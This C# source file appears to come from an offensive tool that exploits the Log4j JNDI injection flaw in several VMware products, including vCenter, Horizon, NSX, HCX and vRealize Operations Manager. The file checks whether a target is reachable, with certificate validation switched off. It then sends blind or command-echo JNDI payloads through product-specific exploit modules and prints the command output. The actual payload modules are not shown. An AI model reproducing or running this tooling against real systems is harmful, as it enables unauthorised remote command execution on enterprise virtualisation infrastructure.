using System.IO;
using System.Net;
using System.Text;
using Vm4j_exp.ExecPayload;

namespace Vm4j_exp
{
    class Tools
    {
        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }
        public static bool CheckTargetAlive(string url)
        {
            Log log = new Log();
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback = new System.Net.Security.RemoteCertificateValidationCallback((sender, certificate, chain, errors) => true);
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Proxy = null;
            //request.ContentType = "application/octet-stream";
            request.KeepAlive = false;
            request.Accept = "*/*";
            request.Timeout = 10000;
            request.AllowWriteStreamBuffering = false;
            try
            {
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Stream answer = response.GetResponseStream();
                response.Close();
                return true;
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.Timeout)
                {
                    log.LogError("Get Error: Timeout");
                    return false;
                }
                log.LogError("Get Error:" + e.Message);
                return false;
            }
        }
        //blind payload
        public static void ExecBlindPayload(string url, string payload,string product)
        {
            Log log = new Log();
            string echoResult;
            switch (product)
            {
                case "VMware HCX":
                    log.LogSuccess("We will use JNDI payload " + payload + " to exploit " + product +" on "+url);
                    echoResult = VHCX.VHCXExec(url, payload);
                    if (echoResult != null)
                    {
                        log.LogSuccess("Exploit success, blind payload.");
                    }
                    log.LogSuccess("Exploit Success.");
                    break;
                case "VMware vCenter":
                    log.LogSuccess("We will use JNDI payload " + payload + " to exploit " + product + " on " + url);
                    echoResult = VCenter.VCenterExec(url, payload);
                    if (echoResult != null)
                    {
                        log.LogSuccess("Exploit success, blind payload.");
                    }
                    log.LogSuccess("Exploit Success.");
                    break;
                case "VMware Workspace One":
                    break;
                case "VMware NSX":
                    log.LogSuccess("We will use JNDI payload " + payload + " to exploit " + product + " on " + url);
                    echoResult = VNSX.VNSXExec(url, payload);
                    if (echoResult != null)
                    {
                        log.LogSuccess("Exploit success, blind payload.");
                    }
                    log.LogSuccess("Exploit Success.");
                    break;
                case "VMware Horizon":
                    log.LogSuccess("We will use JNDI payload " + payload + " to exploit " + product + " on " + url);
                    echoResult = VHorizon.VHorizonExec(url, payload);
                    if (echoResult != null)
                    {
                        log.LogSuccess("Exploit success, blind payload.");
                    }
                    log.LogSuccess("Exploit Success.");
                    break;
                case "VMware vRealize Operations Manager":
                    log.LogSuccess("We will use JNDI payload " + payload + " to exploit " + product + " on " + url);
                    echoResult = VROM.VROMExec(url, payload);
                    if (echoResult != null)
                    {
                        log.LogSuccess("Exploit success, blind payload.");
                    }
                    log.LogSuccess("Exploit Success.");
                    break;
            }
        }
        //echo payload
        public static void ExecEchoPayload(string url, string payload,string cmd, string product)
        {
            Log log = new Log();
            string echoResult;
            switch (product)
            {
                case "VMware HCX":
                    log.LogSuccess("We will use JNDI payload " + payload + " to exploit " + product + " on " + url);
                    echoResult = VHCX.VHCXEcho(url, cmd, payload);
                    if (echoResult != null)
                    {
                        log.LogSuccess("Get result.");
                        Form1.form.infoTxtBox.AppendText("\n" + echoResult);
                    }
                    break;
                case "VMware vCenter":
                    log.LogSuccess("We will use JNDI payload " + payload + " to exploit " + product + " on " + url);
                    echoResult = VCenter.VCenterEcho(url, cmd, payload);
                    if (echoResult != null)
                    {
                        log.LogSuccess("Get result.");
                        Form1.form.infoTxtBox.AppendText("\n" + echoResult);
                    }
                    break;
                case "VMware Workspace One":
                    break;
                case "VMware NSX":
                    log.LogSuccess("We will use JNDI payload " + payload + " to exploit " + product + " on " + url);
                    echoResult = VNSX.VNSXEcho(url, cmd, payload);
                    if (echoResult != null)
                    {
                        log.LogSuccess("Get result.");
                        Form1.form.infoTxtBox.AppendText("\n" + echoResult);
                    }
                    break;
                case "VMware Horizon":
                    log.LogSuccess("We will use JNDI payload " + payload + " to exploit " + product + " on " + url);
                    echoResult = VHorizon.VHorizonEcho(url, cmd, payload);
                    if (echoResult != null)
                    {
                        log.LogSuccess("Get result.");
                        Form1.form.infoTxtBox.AppendText("\n" + echoResult);
                    }
                    break;
                case "VMware vRealize Operations Manager":
                    log.LogSuccess("We will use JNDI payload " + payload + " to exploit " + product + " on " + url);
                    echoResult = VROM.VROMEcho(url, cmd, payload);
                    if (echoResult != null)
                    {
                        log.LogSuccess("Get result.");
                        Form1.form.infoTxtBox.AppendText("\n" + echoResult);
                    }
                    break;
            }
        }
    }
}
